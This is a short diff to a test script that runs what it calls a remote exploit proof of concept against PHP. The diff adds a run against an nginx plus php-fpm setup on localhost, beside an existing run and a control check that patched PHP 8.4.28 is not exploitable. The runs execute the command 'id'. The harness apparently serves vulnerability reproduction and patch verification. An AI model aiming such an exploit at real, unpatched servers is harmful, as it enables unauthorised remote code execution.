@@ -25,6 +25,10 @@ echo "== remote exploit (100% HTTP)"
 python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 \
   --command 'id' --attempts 40
 
+echo "== cross-SAPI: same chain against nginx + php-fpm"
+python3 -u ./phpaftershell-poc --target http://127.0.0.1:8090 \
+  --command 'id' --attempts 40
+
 echo "== control: patched 8.4.28 must NOT be exploitable"
 ! python3 -u ./phpaftershell-poc --target http://127.0.0.1:8088 \
   --command 'id' --attempts 8
